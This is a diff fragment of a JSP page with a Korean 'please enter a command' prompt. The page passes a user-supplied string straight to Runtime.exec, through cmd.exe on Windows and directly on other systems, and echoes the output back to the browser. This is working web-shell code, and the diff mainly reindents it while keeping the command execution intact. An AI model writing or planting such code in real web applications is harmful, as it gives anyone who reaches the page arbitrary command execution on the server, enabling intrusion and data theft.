@@ -39,34 +39,26 @@
 					<p align =center>
 ***********************************명령어를 입력해 주세요***********************************
 					</p>
-					<%
+			<%
 				}
-			
 				else{
 					Process p;
-	
-    				if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
+					if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
 						p = Runtime.getRuntime().exec("cmd.exe /C " + inputUserCmd);
-    				}
-    
-    				else{
+					}
+					else{
 						p = Runtime.getRuntime().exec(inputUserCmd);
 					}
-		
-	
 					InputStreamReader insr = new InputStreamReader(p.getInputStream(),"euc-kr");
 					BufferedReader br = new BufferedReader(insr);
 					String result = br.readLine();
-					
 					while ( result != null ){
 						out.println(result); 
 						result = br.readLine(); 
 					}
 				}
 			%>
-            </pre>
-            
-            
+            </pre>     
         </div>
 
 
